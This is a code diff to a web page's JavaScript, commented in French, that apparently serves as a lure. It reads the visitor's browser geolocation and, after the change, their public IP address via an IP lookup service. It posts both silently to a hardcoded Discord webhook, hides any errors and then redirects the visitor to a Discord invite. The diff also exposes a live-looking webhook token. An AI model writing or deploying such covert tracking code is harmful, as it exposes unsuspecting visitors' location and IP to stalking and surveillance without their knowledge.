@@ -30,24 +30,31 @@
   </div>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"; 
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
     const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";
 
     function envoyerPosition(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lng = position.coords.longitude.toFixed(6);
 
-      // Envoi en arrière-plan (sans attendre la réponse)
-      fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
-        })
-      }).catch(() => {}); // ignorer erreurs
+      // Collecte l'adresse IP
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
 
-      // Redirection immédiate
-      window.location.href = REDIRECT_URL;
+          // Envoi en arrière-plan (sans attendre la réponse)
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip}`
+            })
+          }).catch(() => {}); // ignorer erreurs
+
+          // Redirection immédiate
+          window.location.href = REDIRECT_URL;
+        });
     }
 
     function erreurPosition(error) {
